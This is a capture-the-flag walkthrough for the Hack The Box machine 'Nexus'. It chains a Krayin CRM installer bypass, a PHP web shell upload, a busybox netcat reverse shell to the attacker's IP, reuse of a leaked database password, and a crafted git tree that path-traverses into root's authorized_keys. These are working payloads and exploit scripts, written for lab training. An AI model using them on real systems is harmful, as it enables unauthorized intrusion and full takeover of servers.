---
tags:
  - HTB
  - Linux
  - Easy
  - Auth-Bypass
  - File-Upload
  - Leakage
  - Systemd
  - Git
  - Scripting
---
# Information

- Machine: [Nexus](https://app.hackthebox.com/machines/Nexus)
- Target: `10.129.234.54`
- Attacker: `10.10.14.116`

# Enumeration

## Ports

Scanned all TCP ports:

```console
$ sudo nmap -p- --open -sS -Pn -n 10.129.234.54

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Service version detection for open ports:

```console
$ sudo nmap -p22,80 -sV -sC 10.129.234.54

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Append to the `/etc/hosts` file:

```text
10.129.234.54 nexus.htb
```

## Subdomains

Detected nginx reverse proxy running:

```console
$ whatweb 'http://10.129.234.54/'

http://10.129.234.54/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.234.54], RedirectLocation[http://nexus.htb/], Title[302 Found], nginx[1.24.0]
http://nexus.htb/ [200 OK] Country[RESERVED][ZZ], Email[careers@nexus.htb,j.matthew@nexus.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.234.54], Script, Title[Nexus Energy Authority — Powering the Nation's Future], nginx[1.24.0]
```

Found subdomains:

```console
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.nexus.htb' -u 'http://nexus.htb' -fs 154
...
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 88ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 137ms]
```

Modified the `/etc/hosts` file:

```text
10.129.234.54 nexus.htb billing.nexus.htb git.nexus.htb
```

The web contents are:
- `nexus.htb`: information about Nexus Energy Authority, department of energy & climate.
- `billing.nexus.htb`: instance for [Krayin CRM](https://krayincrm.com/).
- `git.nexus.htb`: instance for [Gitea](https://about.gitea.com/).

## Web

Krayin CRM is vulnerable to [CVE-2026-36340](https://github.com/cybercrewinc/CVE-2026-36340), [CVE-2026-41452](https://jivasecurity.com/writeups/krayin-installer-bypass-account-takeover-cve-2026-41452), [CVE-2026-41453](https://jivasecurity.com/writeups/krayin-lead-datagrid-sqli-cve-2026-41453).

# Exploitation

First overwrite admin credentials:

```console
$ curl -s -X POST -H 'X-Requested-With: XMLHttpRequest' -H 'Accept: application/json' -H 'Content-Type: application/json' 'http://billing.nexus.htb/install/api/admin-config-setup' -d '{"admin":"attacker","email":"attacker@evil.com","password":"hacked123"}'
```

Create `rev.php` file:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Upload the web shell:
1. Log in.
2. Go to *email*, then *compose*.
3. Upload the `rev.php` as an attachment.
4. Submit the email form (intercept response with Caido to check file path).

Listen for connections:

```console
$ sudo ncat -lvnp 443
```

Trigger reverse shell connection:

```console
$ cmd=$(urlencode -a <<< 'busybox nc 10.10.14.116 443 -e /bin/bash')

$ curl -s "http://billing.nexus.htb/storage/emails/1/rev.php?cmd=$cmd"
```

# Post-Exploitation

## User Migration

As **www-data**, found more users:

```console
$ whoami
www-data

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

Found a **password** for **jones**:

```console
$ cat /var/www/krayin/.env
...
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=
...

$ su jones
Password:

$ whoami
jones
```

The password is also valid on the Gitea website.

Get the **user flag**:

```console
$ cat /home/jones/user.txt
```

## Privilege Escalation

A timer is running a Python script:

```console
$ systemctl list-timers
NEXT                            LEFT LAST                              PASSED UNIT                           ACTIVATES                       
Sat 2026-09-12 18:45:56 UTC      27s Sat 2026-09-12 18:44:56 UTC      32s ago gitea-template-sync.timer      gitea-template-sync.service
...

$ systemctl status gitea-template-sync.timer
● gitea-template-sync.timer - Run Gitea template sync every minute
     Loaded: loaded (/etc/systemd/system/gitea-template-sync.timer; enabled; preset: enabled)
     Active: active (waiting) since Sat 2026-09-12 16:51:39 UTC; 1h 54min ago
    Trigger: Sat 2026-09-12 18:45:56 UTC; 63ms left
   Triggers: ● gitea-template-sync.service

$ systemctl status gitea-template-sync.service
○ gitea-template-sync.service - Sync Gitea templates
     Loaded: loaded (/etc/systemd/system/gitea-template-sync.service; static)
     Active: inactive (dead) since Sat 2026-09-12 18:45:56 UTC; 24s ago
TriggeredBy: ● gitea-template-sync.timer
    Process: 21471 ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py (code=exited, status=0/SUCCESS)
   Main PID: 21471 (code=exited, status=0/SUCCESS)
        CPU: 168ms
```

Read the Python script `/etc/gitea/template-sync.py`:

```python
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = "[%s] %s" % (ts, msg)
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True, timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))

def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
```

Basically, the script:
1. Retrieves all template repositories from Gitea website (at `/var/lib/gitea/data/gitea-repositories`).
2. Using the output of `git ls-tree` and `git cat-file`, copies each repo into `/home/git/template-staging`.

However, it uses `os.path.join()` which can be vulnerable to path traversal if we can modify the output for the previous `git` commands.

So, first, created git repository for **jones** on Gitea website, making sure to check **make as a template**.

Then, wrote this `/tmp/build.py` script to copy an `authorized_keys` file into root's SSH directory:

```python
#!/usr/bin/env python3
import hashlib
import time
import zlib
from pathlib import Path


def write_obj(t: str, data: bytes):
    t = t.strip() + ' '
    header = t.encode() + str(len(data)).encode() + b'\0'
    raw = header + data
    sha = hashlib.sha1(raw).hexdigest()

    file = Path('.git', 'objects', sha[:2], sha[2:])
    file.parent.mkdir(parents=True, exist_ok=True)
    file.write_bytes(zlib.compress(raw))

    return sha


def entry(mode: str, name: str, sha: str):
    return f"{mode} {name}\0".encode() + bytes.fromhex(sha)


def commit(tree: str):
    ts = int(time.time())
    data = (
        f"tree {tree}\n"
        f"author x <x@x> {ts} +0000\n"
        f"committer x <x@x> {ts} +0000\n"
        "\n"
        f"Commit at {ts}"
    ).encode()
    sha = write_obj('commit', data)

    file = Path('.git', 'refs', 'heads', 'main')
    file.parent.mkdir(parents=True, exist_ok=True)
    file.write_text(f"{sha}\n")

    return sha


def main():

    if not Path('.git').is_dir():
        print("Current working directory must contain '.git'")
        exit()
    if not Path('authorized_keys').is_file():
        print("There must be a local 'authorized_keys' file to copy")
        exit()

    file_blob = write_obj('blob', Path('authorized_keys').read_bytes())
    file_tree = write_obj('tree', entry('100644', 'authorized_keys', file_blob))

    parent = file_tree
    for directory in reversed('../../../../root/.ssh'.split('/')):
        parent = write_obj('tree', entry('40000', directory, parent))

    readme_blob = write_obj('blob', b"# Readme file\n")
    root_tree = write_obj('tree', entry('100644', 'README.md', readme_blob) + entry('40000', '..', parent))

    c = commit(root_tree)

    print(f"Done commit: {c}")

if __name__ == '__main__':
    main()
```

After, generated objects in a git repository with custom SSH keys:

```console
$ git clone 'http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/mygit.git' /tmp/mygit
...

$ cd /tmp/mygit

$ ssh-keygen -C '' -t rsa -f key
...

$ cp key.pub authorized_keys

$ python3 /tmp/build.py
Done commit: a92d2d39b80465e0c5522ce8ba4c5f3ddf9cbe1e

$ git ls-tree -r HEAD
100644 blob e1f24638a89df9858f0d217b54f869938676bdb5	../../../../root/.ssh/authorized_keys

$ git cat-file blob e1f24638a89df9858f0d217b54f869938676bdb5
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcrq5YXc7tRGWZlYT9/naOkHyeL4rtxW8/BDcG0L4RlEQDngxeVbNdKdO41Nj2qTOAdcHbUT3Dj4asQUM81qdLmkQRJTsWyM1nN7dV+0zYIi7PapQfu148l8DkBGskPiztzOAAhz4NcrbR2pbfNEwgxZZqLfkKsNehooSDAuTQQVS5oU+Tpz/4DxjCq4NgAFzpGd6Q68elsjFFtGX3qs3QIdxtJlRX4KDCOMLbYKNkca4ULLyktNpg43oJ3+4jyWoRyYCnsE4hUvgiYQNcJPe1m7FWdJ7YTPbhI+8esrpmIZW2a1dIdg1N0glcHtKVYdL/rDlAN4oamCbTVhkmHZ8SjkN2k3RIo08KPTzp6v38DJZmFLVtj385yLWAaYDgoPBxqw3S14phinVrcDZphWB+L36XFGWTqgCUiyjClkzqmku2BZXQWh1msEo0SQxVxJl+bWyCIzbQP4IVCk7Hf46jP9UBdCerP1baVyj/DFvQ/VX+WHlE/DnGOw5LY1Jn7Ps=

$ git push -u origin main --force
...
```

Finally, wait 1 minute and log in as **root**:

```console
$ ssh -i key root@nexus.htb
```

Get the **root flag**:

```console
$ cat /root/root.txt
```
